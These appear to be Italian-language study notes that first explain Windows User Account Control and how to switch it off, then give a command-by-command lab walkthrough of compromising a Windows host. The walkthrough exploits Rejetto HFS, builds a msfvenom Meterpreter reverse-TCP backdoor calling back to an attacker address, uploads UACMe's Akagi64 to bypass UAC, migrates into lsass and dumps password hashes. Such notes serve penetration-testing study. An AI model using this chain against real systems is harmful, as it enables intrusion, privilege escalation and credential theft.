L'User Account Control (UAC), o Controllo dell'Account Utente, è una funzione di sicurezza introdotta da Microsoft in Windows Vista per prevenire l'esecuzione di attività potenzialmente pericolose o non autorizzate. Questo sistema è stato perfezionato in Windows 7 e continua a essere presente nelle versioni più recenti di Windows, come Windows 10 e Windows 11.

Ecco alcuni punti chiave riguardanti il Controllo dell'Account Utente (UAC):

1. Scopo: Il UAC impedisce che l'utente possa modificare liberamente le impostazioni più "delicate" del computer e aiuta a individuare software malevoli che tentano di apportare modifiche al sistema.

2. Funzionamento: Quando si avvia un nuovo programma con privilegi amministrativi, il UAC richiede all'utente una conferma tramite un prompt. Questo serve come prima barriera per fermare attività potenzialmente rischiose.

3. Disattivazione temporanea: Se hai bisogno di disattivare temporaneamente il UAC (ad esempio per fare test o installare programmi particolari), puoi farlo seguendo questi passaggi:

   - Windows 10/11: 
     1. Cerca "pannello di controllo" nella barra di ricerca.
     2. Seleziona l'icona del Pannello di controllo.
     3. Fai clic su "Account utente" e poi su "Modifica le impostazioni di controllo dell'account utente".
     4. Imposta l'opzione su "Non notificare mai" e salva i cambiamenti¹.

   - Altre opzioni:
     - Puoi disattivare il UAC solo per gli amministratori, utilizzare l'Editor del registro di sistema o gli Editor Criteri di gruppo locali (solo nelle versioni Pro di Windows), o disattivarlo dal Prompt dei comandi.
     - Tuttavia, tieni presente che disattivare il UAC espone il PC a rischi di sicurezza e potrebbe compromettere la stabilità di Windows.


Migrare un processo:



```
# UACMe - Exploitation UAC 

> nmap -sV -p 80 10.4.19.119`
> Exploit rejetto
> Got meterpreter
> getuid

> pgrep explorer
> migrate 2708
> getprivs
> shell

> net user
> net localgroup administrators
Access denied

Use UACMe Akagmi already present on the attack machine
> msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.4.2 LPORT=1234 -f exe > backdoor.exe

> use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.4.2
set LPORT 1234
run

Per disattivare il UAC, carico una backdor + l'eseguibile di Akagi64.
Go to old meterpreter session:
> cd C:\\\\
mkdir Temp
cd Temp
upload /root/backdoor.exe
upload /root/Desktop/tools/UACME/Akagi64.exe
Akagi64.exe 23 C:\\Temp\\backdoor.exe

Now run getprivs - Got privilege escalation
> Migrate to a NT AUTHORITY\\SYSTEM service
> ps -S lsass.exe
> migrate 692
> hashdump

```